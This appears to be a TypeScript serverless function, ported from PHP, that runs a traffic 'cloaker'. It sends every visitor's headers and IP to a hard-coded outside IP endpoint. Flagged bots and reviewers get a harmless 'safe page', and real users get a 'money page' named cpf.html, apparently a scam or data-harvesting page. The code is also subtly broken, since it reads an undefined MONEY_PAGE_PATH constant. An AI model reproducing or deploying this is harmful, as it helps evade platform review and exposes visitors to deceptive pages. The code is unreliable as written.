import type { VercelRequest, VercelResponse } from '@vercel/node';
import fetch from 'node-fetch';
import { readFileSync } from 'fs';
import { resolve } from 'path';

// O caminho para o seu index.html (Money Page) dentro do ambiente Vercel Function
// O ambiente Vercel Function é isolado, então usamos 'resolve' para garantir o caminho correto.
const WHITE_PAGE_PATH = resolve(process.cwd(), 'noticia'); // Safe Page
const BLACK_PAGE_PATH = resolve(process.cwd(), 'cpf.html'); // Money Page

// Tenta ler o conteúdo da Money Page uma vez
let moneyPageContent: string | null = null;
try {
  moneyPageContent = readFileSync(MONEY_PAGE_PATH, 'utf-8');
} catch (error) {
  console.error("Erro ao ler index.html (Money Page):", error);
}

export default async function handler(req: VercelRequest, res: VercelResponse) {
  // 1. Verificação de Teste (Equivalente ao _check() do PHP)
  if (req.query['TS-BHDNR-84848']) {
    // O valor 'bf9883aa7b' é do seu código PHP original
    return res.status(200).send('bf9883aa7b');
  }

  try {
    // 2. Coletar Headers (Equivalente ao get_header() do PHP)
    const headers: Record<string, any> = {};
    // Coleta todos os headers da requisição
    for (const key in req.headers) {
        headers[key.toUpperCase().replace(/-/g, '_')] = req.headers[key];
    }
    
    // Adiciona os headers específicos do TrafficShield (do seu código PHP)
    headers['TS_BHDNR_74191'] = '900661405756137';
    headers['TS_BHDNR_74194'] = 'bf9883aa7b'; 
    
    // Adiciona informações de endereço e URI (equivalente a $_SERVER)
    headers['REMOTE_ADDR'] = req.socket.remoteAddress || req.headers['x-forwarded-for'] || req.headers['x-real-ip'];
    headers['REQUEST_URI'] = req.url || '/';
    headers['HTTP_HOST'] = req.headers.host;
    headers['REQUEST_METHOD'] = req.method;

    // 3. Fazer POST para API TrafficShield (Equivalente ao https_request() do PHP)
    const trafficShieldResponse = await fetch('http://198.211.101.164/v2/logic/cloaker', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      // Codifica os headers em base64, como o PHP fazia
      body: `headers=${Buffer.from(JSON.stringify(headers)).toString('base64')}`
    });

    const result = await trafficShieldResponse.json();

    // 4. Processar Resposta (Equivalente ao main() e get_url() do PHP)
    if (result && result.zrc) {
      // Tráfego bloqueado (Bot) - Retornar conteúdo alternativo (Safe Page)
      const content = Buffer.from(result.zrc, 'base64').toString('utf-8');
      
      // Envia o conteúdo da Safe Page diretamente
      return res.status(200).send(content);
      
    } else if (result && result.url) {
      // Tráfego aprovado (Usuário real) - Redirecionar para a URL final (Money Page)
      
      // O seu código PHP fazia um redirecionamento, mas como o objetivo é servir o site,
      // vamos tentar servir o index.html, que é a sua Money Page.
      
      if (moneyPageContent) {
        return res.status(200).send(moneyPageContent);
      } else {
        // Se a Money Page não puder ser lida, faz o redirecionamento
        const code = result.http_code || 302;
        res.writeHead(code, { 'Location': result.url });
        return res.end();
      }
      
    } else {
      // Caso não haja resposta clara, servir a Money Page por segurança (Fail-Safe)
      if (moneyPageContent) {
        return res.status(200).send(moneyPageContent);
      } else {
        return res.status(500).send('Erro na verificação do cloaker. Conteúdo principal indisponível.');
      }
    }
  } catch (error) {
    console.error('TrafficShield verification error:', error);
    
    // Em caso de erro, servir a Money Page (Fail-Safe)
    if (moneyPageContent) {
        return res.status(200).send(moneyPageContent);
    } else {
        return res.status(500).send('Erro crítico na função do cloaker.');
    }
  }
}
